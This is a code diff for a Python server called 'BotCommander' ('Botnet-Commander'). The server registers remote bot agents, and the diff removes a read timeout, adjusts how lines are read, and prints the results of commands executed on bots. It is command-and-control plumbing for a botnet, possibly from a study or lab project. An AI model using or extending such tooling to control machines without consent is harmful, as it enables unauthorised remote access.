@@ -19,22 +19,20 @@ def load_conf():
         log_level = int(config_parser.get("CORE", "LOG_LEVEL"))
         log_dir = config_parser.get("CORE", "LOG_DIR")
         log_name = config_parser.get("CORE", "LOG_NAME")
-        read_tout = int(config_parser.get("CORE", "READ_TOUT"))
         offline_tout = int(config_parser.get("CORE", "OFFLINE_TOUT"))
     except Exception as err:
         print("Error initializing CORE, Commander not started because config file could not be loaded. Unexpected "
               "exception occurred: {}".format(err))
         exit(5)
-    return host, port, log_level, log_dir, log_name, read_tout, offline_tout
+    return host, port, log_level, log_dir, log_name, offline_tout
 
 
 class BotCommander:
-    def __init__(self, host, port, read_tout, offline_tout):
+    def __init__(self, host, port, offline_tout):
         self.uuids = {}
         self.host = host
         self.port = port
         self.offline_tout = offline_tout
-        self.read_tout = read_tout
         self.sock = socket(AF_INET, SOCK_STREAM)
         loop = asyncio.new_event_loop()
         loop.create_task(self.__process_user_input())
@@ -170,6 +168,7 @@ class BotCommander:
             if b"\n" in buffer:
                 (line, buffer) = buffer.split(b"\n", 1)
                 data_list.append(line)
+                return data_list
             else:
                 logger.core.debug(f"Received {data_list} from bot-agent {addr} so far, waiting for more data")
                 more_data = await self.__read_line(reader, addr)
@@ -274,7 +273,7 @@ class BotCommander:
                     op_sys = json_msg.get("os")
                     self.uuids[uuid] = {"hostname": hostname, "addr": addr, "online": True, "os": op_sys,
                                         "reader": reader, "writer": writer}
-                    logger.core.debug(f"Successfully added agent {hostname}-{uuid} to DB")
+                    logger.core.info(f"Successfully added agent {hostname}-{uuid} to DB")
                     return uuid
             case "botHello":
                 payload = self.__json_builder("botHelloReply", self.uuids[uuid_in].get("hostname"))
@@ -289,7 +288,10 @@ class BotCommander:
                 else:
                     return False
             case "exeCommandReply":
-                pass
+                command = json_msg.get("command")
+                response = json_msg.get("result")
+                print(f"Response from bot-agent {addr} for command {command} is: {response}")
+                return True
             case "putFileReply":
                 pass
             case "getFileReply":
@@ -350,7 +352,7 @@ class BotCommander:
 
 
 if __name__ == "__main__":
-    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, READ_TOUT, OFFLINE_TOUT = load_conf()
+    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, OFFLINE_TOUT = load_conf()
     logger = CoreLogger(LOG_LEVEL, LOG_DIR, LOG_NAME)
-    srv = BotCommander(HOST, PORT, READ_TOUT, OFFLINE_TOUT)
+    srv = BotCommander(HOST, PORT, OFFLINE_TOUT)
     logger.core.info("Botnet-Commander exited")
